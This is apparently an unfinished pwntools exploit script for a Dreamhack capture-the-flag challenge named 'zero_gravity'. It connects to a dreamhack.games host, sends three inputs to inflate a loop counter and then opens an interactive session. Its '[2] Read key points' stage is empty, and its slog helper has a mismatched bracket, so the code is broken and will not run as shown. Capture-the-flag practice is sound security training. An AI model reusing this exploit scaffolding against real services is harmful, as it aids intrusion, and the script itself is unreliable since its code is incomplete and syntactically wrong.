from pwn import *
def slog(name, addr):
	return success(": ".join([name, hex(addr)))

LOCAL = False
if LOCAL == True:
	p = process("./zero_gravity")
else:
	PORT = int(input("Input Port: "))
	HOST = int(input("Input Host: "))
	p = remote("host"+str(HOST)+".dreamhack.games", PORT)

# [1] Increase cnt for loop
p.sendlineafter(">> ", "a")
p.sendlineafter(">> ", "16")
p.sendlineafter(">> ", "50")

# [2] Read key points

p.interactive()
